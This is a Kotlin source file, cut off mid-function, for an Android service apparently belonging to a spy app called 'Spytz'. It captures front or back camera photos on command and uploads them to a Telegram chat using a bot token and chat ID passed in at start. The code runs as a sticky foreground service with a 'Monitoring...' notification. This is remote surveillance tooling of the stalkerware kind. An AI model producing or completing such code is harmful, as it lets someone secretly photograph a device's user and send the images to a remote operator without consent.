package com.spy.tz

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch

class NotificationService : Service() {

    private var notificationManager: NotificationManager? = null
    private var notificationBuilder: NotificationCompat.Builder? = null
    private val scope = CoroutineScope(Dispatchers.Main + Job())
    
    private lateinit var botHelper: TelegramBotHelper
    private var botToken: String = ""
    private var chatId: Long = 0L

    override fun onCreate() {
        super.onCreate()
        notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
        
        // Create Channel
        val channel = NotificationChannel("SPYTZ_CHANNEL", "Spytz Notifications", NotificationManager.IMPORTANCE_LOW)
        notificationManager?.createNotificationChannel(channel)
        
        notificationBuilder = NotificationCompat.Builder(this, "SPYTZ_CHANNEL")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentTitle("Spytz Active")
            .setContentText("Monitoring...")
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)

        startForeground(1, notificationBuilder?.build()!!)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        botToken = intent?.getStringExtra("BOT_TOKEN") ?: ""
        chatId = intent?.getLongExtra("CHAT_ID", 0L) ?: 0L
        
        botHelper = TelegramBotHelper(this)
        
        // If you have a Camera View in your UI, initialize it here or from Activity
        // For this service example, we assume basic commands are triggered via broadcast or local events
        
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    // --- COMMAND HANDLERS ---

    fun handleSwitchCamera() {
        // Requires Activity reference usually, but here we log or trigger UI update
        Log.d("NotificationService", "Switching Camera")
        // Note: Actual UI switching needs Activity context. 
        // If you just want to toggle backend state, do it here.
    }

    fun handleTakePhoto(isBack: Boolean) {
        scope.launch {
            val result = botHelper.takePhoto(isBack)
            if (result.isSuccess) {
                val file = result.getOrNull()
                if (file != null && file.exists()) {
                    val uploadResult = botHelper.sendPhotoToBot(file, chatId, botToken, "Captured Photo")
                    if (uploadResult.isFailure) {
                        Log.e("NotificationService", "Failed to send photo: ${uploadResult.exceptionOrNull()?.message}")
                    }
                }
            }
